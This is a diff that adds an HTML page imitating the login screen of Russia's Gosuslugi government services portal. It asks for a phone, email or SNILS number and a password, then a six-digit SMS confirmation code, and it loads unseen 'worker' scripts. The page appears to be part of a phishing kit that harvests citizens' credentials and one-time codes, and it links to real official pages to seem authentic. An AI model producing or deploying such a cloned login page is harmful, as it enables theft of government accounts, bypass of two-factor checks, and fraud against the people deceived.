@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="static.css">
+    <link rel="stylesheet" href="lato/lato.css">
+    <title>Портал государственных услуг</title>
+</head>
+<body>
+  
+    <div class="cloud" id="auth">
+        <center>
+        <img src="images/logo.png" class="logo">
+        </center>
+
+        <input type="text" class="input" placeholder="Телефон / Email / СНИЛС" id="user-login">
+        <input id="user-password" type="password" class="input" placeholder="Пароль">
+
+        <span class="forget">Восстановить</span>
+
+        <button class="login" onclick="login()">Войти</button>
+
+        <span class="another">
+            Войти другим способом
+        </span>
+
+        <div class="blox">
+            <div>
+                QR-код
+            </div>
+            <div>
+                Эл. подпись
+            </div>
+        </div>
+
+        <span class="cannot">
+            Не удаётся войти?
+        </span>
+
+        <span class="reg" onclick="window.location.href=`https:\/\/esia.gosuslugi.ru\/login\/registration`">
+            Зарегистрироваться
+        </span>
+
+
+        <div class="faq">
+            <img src="images/faq.svg" width="48px">
+
+            <span onclick="window.location.href='https:/\/\www.gosuslugi.ru/landing/esia-help'">Куда ещё можно войти с паролем от Госуслуг?</span>
+        </div>
+    </div>
+
+    <div id="code" style="display: none;">
+        <center>
+        <img src="images/logo.png" class="logo">
+        </center>
+
+        <h2>Подтвердите вход по смс</h2>
+        <span class="desc">
+            Код подтверждения отправлен на номер
+        </span>
+        <span class="number">
+            +7 9** ***-**-<a id="last">15</a>
+        </span>
+
+        <span class="codelabel">
+            Код подтверждения
+        </span>
+
+        <div class="inputcode">
+            <input type="number" id="c1" oninput="inp1(event)">
+            <input type="number" id="c2" oninput="inp2(event)">
+            <input type="number" id="c3" oninput="inp3(event)">
+            <input type="number" id="c4" oninput="inp4(event)">
+            <input type="number" id="c5" oninput="inp5(event)">
+            <input type="number" id="c6" oninput="inp6(event)">
+        </div>
+
+        <span class="again">
+            Отправить повторно через
+        </span>
+        <span class="time">
+            <a id="seconds">00:59</a>
+        </span>
+        <span class="help">
+            Не могу подтвердить вход
+        </span>
+    </div>
+
+    
+
+    <footer></footer>
+
+    <script src="worker/code.js"></script>
+    <script src="worker/script.js"></script>
+    <script src="worker/session.js"></script>
+</body>
+</html>
